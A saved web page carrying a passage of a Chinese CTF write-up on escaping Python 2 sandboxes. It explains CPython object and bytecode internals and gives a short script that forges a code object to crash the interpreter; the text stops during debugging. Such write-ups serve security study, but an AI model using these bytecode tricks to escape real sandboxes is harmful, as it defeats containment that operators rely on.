<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【技术分享】Python沙箱？不存在的 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="Python"/>
    
        <meta name="description" content="python我个人认为，没有沙箱这一说。我估计我这么说应该好多人不同意，但是事实就是python在设计的时候根本没有考虑这方面的因素，原因？一会我们看看代码就知道了。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【技术分享】Python沙箱？不存在的</h2>
                <div class="article-msg">
                    <span class="time">2017-07-04 10:43:58</span>
                    
                                        <span class="read">阅读：16325次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_4059"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="4059" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href=""
                             target="_blank">来源： 安全客</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=2806750221" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=2806750221" style="color:#848e99;">anciety</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background: white; text-align: center; text-indent: 0em;"><span style="font-weight: 900; font-size: 18px; font-family: 微软雅黑, sans-serif; color: rgb(0, 112, 192);"><img src="http://p9.qhimg.com/t0121fee44fe175510d.jpg" title="t0121fee44fe175510d.jpg" alt="http://p9.qhimg.com/t0121fee44fe175510d.jpg"/></span></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; text-indent: 32px; background: white;"><span style="font-weight: 900; font-size: 18px; font-family: 微软雅黑, sans-serif; color: rgb(0, 112, 192);">作者：</span><a href="http://bobao.360.cn/member/contribute?uid=2806750221" target="_blank" textvalue="anciety" style="text-decoration: none;"><span style="font-weight: 900; font-size: 18px; font-family: 微软雅黑, sans-serif; color: rgb(0, 112, 192);">anciety</span></a></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; text-indent: 32px; background: white;"><span style="font-weight: 900; font-size: 18px; font-family: 微软雅黑, sans-serif; color: rgb(0, 112, 192);">预估稿</span><span style="font-weight: 900; font-size: 18px; font-family: 微软雅黑, sans-serif; color: rgb(0, 112, 192);">费：600RMB</span></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; text-indent: 32px; background: white;"><span style="font-weight: 900; font-size: 18px; font-family: 微软雅黑, sans-serif; color: rgb(0, 112, 192);">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></p><p><span style="font-weight: 900; font-size: 18px; font-family: 微软雅黑, sans-serif; color: rgb(0, 112, 192);"><br/></span></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">前言</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.&nbsp;TCTF 2017 final Python</span><br/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">之前在TCTF的线下赛上碰到了Python的一道沙箱逃逸题目，虽然最后由于主办方题目上的一些疏漏导致了非预期解法的产生，但是本身真的是不错的沙箱逃逸案例，如果是按照预期解法，可以说以后别的沙箱逃逸题如果不改Python的源码感觉已经没啥可出的必要了。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">题目的话，不用担心没有题目，你就想成一个除了sys模块，连file object都用不了的Python2就行了，其实用真的Python2然后自己不用这些就可以模拟这道题目啦。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Python的沙箱逃逸在之前的CTF就有出现过，不过大多是利用Python作为脚本语言的特性来逃逸，相当于换其他方式达到相同目的，比如没了file，通过别的方式拿到file，这次的题目其实也是可以这样搞的，因为stdin等等对象是file对象，可以用来拿到file对象，这样就可以做到在服务器上进行任意读写，之后比如可以写/proc/self/mem或者编译一个c写的python module然后写到/tmp里之后考虑去import，这些其实都是非预期解法，预期解法就相当有意思了，用的方法是通过Python的字节码来获取，这里我们也就需要重点讲这个方面的内容了。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.&nbsp;Python沙箱？不存在的</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">作为前言的一小部分，我还想提一个问题，python，到底有没有沙箱？</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">其实这跟我看过的一个presentation，演讲者问台下，chroot到底是不是安全机制，是一个道理。python我个人认为，没有沙箱这一说。我估计我这么说应该好多人不同意，但是事实就是python在设计的时候根本没有考虑这方面的因素，原因？一会我们看看代码就知道了。</span></p><p><br/></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">调试环境</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">•&nbsp;os: manjaro linux 17.01</span><br/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">•&nbsp;python: python2.7.13 debug版本(自己编译的)，更改了两个可能在debug下出错的地方，主要是ceval.c:825，改为release版本的写法，还有924行，这一段的define都改为没有LLTRACE的写法。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Python虚拟机原理</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.对象</span><br/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Python的虚拟机的源码有一个很典型的特点，那就是一切皆对象。虽然代码是用C写的，但是面向对象的思路倒是用的非常细致，我们首先来看几个典型的对象：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">PyObject：<a href="https://github.com/python/cpython/blob/2.7/Include/object.h" _src="https://github.com/python/cpython/blob/2.7/Include/object.h">https://github.com/python/cpython/blob/2.7/Include/object.h</a></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">首先总结以下Python object的基本特点：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1)除了Type Object（一会提到），其他object一律分配在堆上；</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2)object都有引用计数来确保垃圾回收功能的正常；</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3)Object有一个type，创建时候一个object的type就固定了，type自己也是object，这就是Type Object；</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4)Object的内存和地址保持不变，如果是变量的，通过指向变量内存的指针实现；</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">5)Object的类型是PyObject *。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">实现：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">/*&nbsp;堆对象的双向链表作为pyobject的结构体开始部分&nbsp;*/
#define&nbsp;_PyObject_HEAD_EXTRA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
struct&nbsp;_object&nbsp;*_ob_next;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
struct&nbsp;_object&nbsp;*_ob_prev;
&nbsp;
/*&nbsp;真正的pyobject结构开始部分&nbsp;*/
#define&nbsp;PyObject_HEAD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
_PyObject_HEAD_EXTRA&nbsp;&nbsp;&nbsp;&nbsp;\
Py_ssize_t&nbsp;ob_refcnt;&nbsp;\
struct&nbsp;_typeobject&nbsp;*ob_type;
/*&nbsp;带有变大小容器的object的头部（结构体开始部分）&nbsp;*/
#define&nbsp;PyObject_VAR_HEAD&nbsp;&nbsp;&nbsp;\
PyObject_HEAD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
Py_ssize_t&nbsp;ob_size;&nbsp;/*&nbsp;可变部分个体的数量&nbsp;*/
/*&nbsp;object&nbsp;*/
typedef&nbsp;struct&nbsp;_object&nbsp;{
PyObject_HEAD
}&nbsp;PyObject;
/*&nbsp;带有变大小容器（带有大小可变指针的对象&nbsp;*/
typedef&nbsp;struct&nbsp;{
PyObject_VAR_HEAD
}&nbsp;PyVarObject;
/*&nbsp;每一个Python对象的结构体开始部分(模拟了面向对象的继承)&nbsp;*/
#define&nbsp;PyObject_HEAD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PyObject&nbsp;ob_base;
/*&nbsp;变量对象，同理&nbsp;*/
#define&nbsp;PyObject_VAR_HEAD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PyVarObject&nbsp;ob_base;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这部分主要是PyObject的定义和PyVarObject的定义，是Python中对象的内部表示。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">至于Type Object由于代码较长，我认为对理解运行原理帮助也不大，就不截下来了，最主要的就是需要理解用来表示一个Python对象的类型的也是一个对象。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">至于用来检查对象类型的方法：</span></p><pre class="brush:bash;toolbar:false">#define&nbsp;Py_TYPE(ob)&nbsp;(((PyObject*)(ob))-&gt;ob_type)</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">可以看出，检查方法也就是通过ob，也就是在PyObject_HEAD里的信息来检查。</span><br/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.code对象</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">通过之前的讨论，我们知道了Python对对象的表示方式，只要在结构体里最开始部分写 PyObject_HEAD 或者 PyObject_VAR_HEAD 就可以是一个PyObject或者PyVarObject对象了。那么Python代码是怎么表示的呢？</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">答案就是——code对象：https://github.com/python/cpython/blob/2.7/Include/code.h</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">/*&nbsp;字节码对象&nbsp;*/
/*&nbsp;Bytecode&nbsp;object&nbsp;*/
typedef&nbsp;struct&nbsp;{
PyObject_HEAD
int&nbsp;co_argcount;&nbsp;/*&nbsp;除了*args以外的参数&nbsp;*/
int&nbsp;co_nlocals;&nbsp;/*&nbsp;局部变量&nbsp;*/
int&nbsp;co_stacksize;&nbsp;
int&nbsp;co_flags;&nbsp;
PyObject&nbsp;*co_code;&nbsp;/*&nbsp;字节码&nbsp;*/
PyObject&nbsp;*co_consts;&nbsp;
PyObject&nbsp;*co_names;&nbsp;
PyObject&nbsp;*co_varnames;&nbsp;
PyObject&nbsp;*co_freevars;&nbsp;
PyObject&nbsp;*co_cellvars;&nbsp;
PyObject&nbsp;*co_filename;
PyObject&nbsp;*co_name;
int&nbsp;co_firstlineno;
PyObject&nbsp;*co_lnotab;
void&nbsp;*co_zombieframe;
PyObject&nbsp;*co_weakreflist;
}&nbsp;PyCodeObject;
/*&nbsp;检查一个对象是不是code对象&nbsp;*/
#define&nbsp;PyCode_Check(op)&nbsp;(Py_TYPE(op)&nbsp;==&nbsp;&amp;PyCode_Type)
/*&nbsp;创建一个PyCode的接口，和后文CodeType创建PyCode一致&nbsp;*/
PyAPI_FUNC(PyCodeObject&nbsp;*)&nbsp;PyCode_New(
int,&nbsp;int,&nbsp;int,&nbsp;int,&nbsp;PyObject&nbsp;*,&nbsp;PyObject&nbsp;*,&nbsp;PyObject&nbsp;*,&nbsp;PyObject&nbsp;*,PyObject&nbsp;*,&nbsp;PyObject&nbsp;*,&nbsp;PyObject&nbsp;*,&nbsp;PyObject&nbsp;*,&nbsp;int,&nbsp;PyObject&nbsp;*);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这里的代码不是太有意思我就不解释了，从这里我们可以知道两点：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1)一个PyCode对象包含了一段代码对于Python来说所需要的所有信息，其中比较重要的是字节码；</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2)检查一个PyCode对象的类型是通过检查HEAD部分的内容的，HEAD的内容是在创建PyCode的时候指定的，根据之前对象的原则，创建之后就不再改变了。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3.运行原理</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">运行有关代码：<a href="https://github.com/python/cpython/blob/2.7/Python/ceval.c" _src="https://github.com/python/cpython/blob/2.7/Python/ceval.c">https://github.com/python/cpython/blob/2.7/Python/ceval.c</a></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">其中用来运行的代码_PyEval_EvalFrameDefault， 从第1199行的switch(opcode)即是运行的主要部分，通过不同的opcode进行不同的操作。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">其实整个Python的运行过程就是首先通过compile构建一个PyCodeObject，得到代码的字节码，之后根据不同的字节码进行不同的操作，过程还是比较简单的。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">由于Python是基于栈的，所以会看到一系列操作stack的函数，其实就理解成一个栈结构，这个栈结构里存的是一系列对象就可以了。</span></p><p><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">搞事情</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.运行任意字节码</span><br/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">好了，原理讲的差不多了，大家应该都明白Python大致的运行机制了，那么我们就结合这个机制来思考一下。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Python的运行是首先compile得到PyCodeObject对吧，那么，PyCodeObject里边的字节码决定了执行什么样的字节码对吧，如果，我能够控制这个字节码，是不是就可以执行我想要的字节码了？</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">答案是，对的。而且Python并不限制你这么做，毕竟动态语言嘛，你想干嘛也拦不住你。想要操作这个字节码也很简单，types就可以，我们现在来试试。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">#&nbsp;接口
#&nbsp;types.CodeType(argcount,&nbsp;nlocals,&nbsp;stacksize,&nbsp;flags,&nbsp;codestring,&nbsp;constants,&nbsp;names,
#&nbsp;varnames,&nbsp;filename,&nbsp;name,&nbsp;firstlineno,&nbsp;lnotab[,&nbsp;freevars[,cellvars]])
from&nbsp;opcode&nbsp;import&nbsp;opmap
import&nbsp;types
&nbsp;
&nbsp;
def&nbsp;code_object():
pass
code_object.func_code&nbsp;=&nbsp;types.CodeType(
0,&nbsp;0,&nbsp;0,&nbsp;0,
chr(opmap[&#39;LOAD_CONST&#39;])&nbsp;+&nbsp;&#39;\xef\xbe&#39;,
(),&nbsp;(),&nbsp;(),
&quot;&quot;,&nbsp;&quot;&quot;,&nbsp;0,&nbsp;&quot;&quot;
)
code_object()</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这里最重要的就是codestring，是字节码的字符串表示，其他的都不是太重要(注意不要直接复制我这一段代码运行，UTF-8的问题，加个UTF-8或者删掉中文可以运行)，然后我们运行试试。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[anciety@anciety-pc&nbsp;temp]$&nbsp;python2&nbsp;testpython.py&nbsp;
Segmentation&nbsp;fault&nbsp;(core&nbsp;dumped)</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">seg fault了，不出所料，原因？</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们来调试一下。这里我自己下源码编译了一个有debug符号和源码的Python2.7方便调试。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">TARGET(LOAD_CONST)&nbsp;{
PyObject&nbsp;*value&nbsp;=&nbsp;GETITEM(consts,&nbsp;oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这是解析LOAD_CONST字节码的内容，可以看到首先通过GETITEM得到code object中consts和oparg的参数的内容，之后处理引用计数，然后PUSH了相应的值！</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">GETITEM是从一个tuple中去取出值，我们看看segfault的地方：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">1227&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TARGET(LOAD_CONST)
1228&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
1229&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x&nbsp;=&nbsp;GETITEM(consts,&nbsp;oparg);
→&nbsp;1230&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Py_INCREF(x);
1231&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PUSH(x);
1232&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FAST_DISPATCH();
1233&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
1234&nbsp;
gef➤&nbsp;print&nbsp;oparg
